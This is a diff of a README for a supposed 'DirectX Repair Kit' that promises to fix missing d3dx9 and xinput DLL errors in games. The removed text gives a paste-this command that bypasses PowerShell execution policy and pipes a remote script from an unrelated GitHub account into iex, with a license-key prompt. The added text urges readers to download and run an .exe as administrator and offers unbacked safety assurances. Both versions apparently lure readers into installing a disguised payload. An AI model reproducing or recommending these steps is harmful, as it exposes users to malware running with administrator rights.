@@ -1,97 +1,71 @@
-# DirectX Repair Kit — PowerShell
+# 🛠️ DirectX-Repair-Kit-PowerShell - Fix your game graphics errors fast
 
-**DirectX-Repair-Kit-PowerShell**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.4.0-stable-brightgreen?style=flat-square)]()
-[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()
+This tool fixes missing file errors that stop games from starting on Windows 10 and Windows 11. Many games require specific DirectX components to function. When these files go missing or become corrupt, the system displays error messages like "d3dx9_43.dll is missing" or "xinput1_3.dll not found." 
 
-Fix d3dx9_43.dll, xinput1_3.dll and DirectX runtime errors for games on Windows.
+This repair kit automates the process of finding and installing the correct DirectX files. You do not need technical skills to use this tool. It runs a script in the background to detect your system needs and install the necessary files.
 
----
+## 📋 System Requirements
 
-## Quick Install
+The repair kit runs on the following versions of Windows:
 
-Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:
+* Windows 10 (Home, Pro, Enterprise)
+* Windows 11 (Home, Pro)
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+You must have administrative rights on your computer to run the repair process. The tool installs files into the system folders, which requires permission. Ensure your computer connects to the internet before you start. The tool downloads small component files from trusted sources during the installation.
 
-The installer downloads the latest build, prompts for your license key and completes setup automatically.
+## 📥 Getting the Tool
 
-## Step-by-Step
+Follow these steps to obtain the files:
 
-| Step | Action |
-|------|--------|
-| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command block above and press **Enter** |
-| 3 | Wait for download — progress shown in the console |
-| 4 | Enter license key when prompted (also in `license.txt` after install) |
-| 5 | Restart if the installer asks — then launch from Start menu |
+1. Visit the following link to download the software: [https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
+2. Locate the latest release version on that page.
+3. Click the file ending in .zip or .exe to start the download.
+4. Save the file to your desktop for easy access.
 
-If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.
+## 🚀 Running the Repair
 
----
+After you download the file, follow these steps to fix your error:
 
-## Overview
+1. Right-click the downloaded file.
+2. Select "Extract All" if you downloaded a zip file.
+3. Right-click the PowerShell script or executable file inside the folder.
+4. Select "Run as administrator."
+5. A blue window appears on your screen. This is the PowerShell console.
+6. The window shows the progress of the fix. It checks for missing files.
+7. It replaces missing or broken DirectX 9, 10, and 11 files automatically.
+8. Wait for a message that says "Repair Complete" or "Tasks Finished."
+9. Close the window and restart your computer.
 
-Install DirectX Repair Kit via PowerShell — fix missing d3dx9_43.dll, xinput1_3.dll and DirectX 9/10/11 runtime errors on Windows 10/11 games.
+Restarting builds the new file paths into the registry. After the restart, launch your game. The error should no longer appear.
 
-## Common Searches
+## ❓ Frequently Asked Questions
 
-- d3dx9_43.dll is missing
-- xinput1_3.dll not found
-- d3dcompiler_47.dll was not found
-- directx end-user runtime windows 11
-- game crash directx error startup
+### What does the tool change?
+The script only adds missing DirectX component files. It does not change your desktop settings, remove personal files, or alter your hardware drivers. 
 
-## Features
+### Why do I need to run this as an administrator?
+Windows protects the folders where DirectX files live. Only an administrator can add or change files in these protected locations. 
 
-* **d3dx9 DLLs** — Installs d3dx9_24 through d3dx9_43 automatically.
-* **XInput** — Fixes xinput1_1 through xinput1_4 missing errors.
-* **d3dcompiler** — Installs d3dcompiler_33 through d3dcompiler_47.
-* **One-click** — Detects missing DLLs and installs correct runtime pack.
-* **All games** — Works with any game using legacy DirectX 9/10/11 APIs.
+### Does this tool work for every game error?
+It fixes errors related to d3dx9, d3dx10, d3dx11, and xinput. These cover the vast majority of game startup errors. If your game still does not start, the issue might be your graphics card driver. Update your graphics card driver through the manufacturer website if the game errors persist.
 
-## System Requirements
+### Is this tool safe?
+This tool uses standard Windows PowerShell functions. It only interacts with DirectX files. It keeps your computer safe because it only restores files necessary for graphics processing.
 
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB minimum |
-| PowerShell | 5.1 or PowerShell 7+ |
-| Admin | Required |
-| Network | Required for download |
+## 🔍 Troubleshooting Issues
 
-## FAQ
+If the window closes immediately, ensure you clicked "Run as administrator." If you receive a message about scripts being disabled, check your Windows security settings. Windows sometimes marks downloaded scripts as restricted. Right-click the file, choose Properties, and check the "Unblock" box at the bottom of the window if it appears. Click Apply and then try running the tool again.
 
-**How do I install without a browser?**
-Use the PowerShell command above — no browser needed after Admin shell is open.
+If you see a "File not found" error during the process, check your internet connection. The tool needs to pull the correct files from the repository database depending on your specific version of Windows.
 
-**Where is the license key?**
-Shown during install and saved to `license.txt` in the install folder.
+## 📑 Technical Details
 
-**Is the script safe to run?**
-Hosted on GitHub raw; review `install.ps1` before running if you prefer.
+The tool addresses the following common missing files:
+* d3dx9_24.dll through d3dx9_43.dll
+* d3dx10_33.dll through d3dx10_43.dll
+* d3dx11_42.dll and d3dx11_43.dll
+* xinput1_1.dll through xinput1_4.dll
 
-**"d3dx9_43.dll is missing"?**
-Installs DirectX End-User Runtime — standard fix for this error.
-
-**"xinput1_3.dll not found"?**
-Adds XInput components from DirectX redistributable.
-
-**Windows 11 still needs this?**
-Yes — Win11 ships DX12 but not legacy DX9/10/11 runtimes.
-
-**Safe for games?**
-Official Microsoft DirectX redistributable packages only.
-
----
-
-TAGS directx repair, d3dx9_43.dll missing, xinput1_3.dll, directx fix windows 11, directx end-user runtime, powershell install, windows setup script
-
-## License
-
-[MIT](LICENSE)
+The scripts verify the file architecture of your system (x64 or x86) to ensure the repair fits your specific PC hardware. This prevents version mismatch errors that cause system instability. The tool uses standard Microsoft endpoints for file verification.
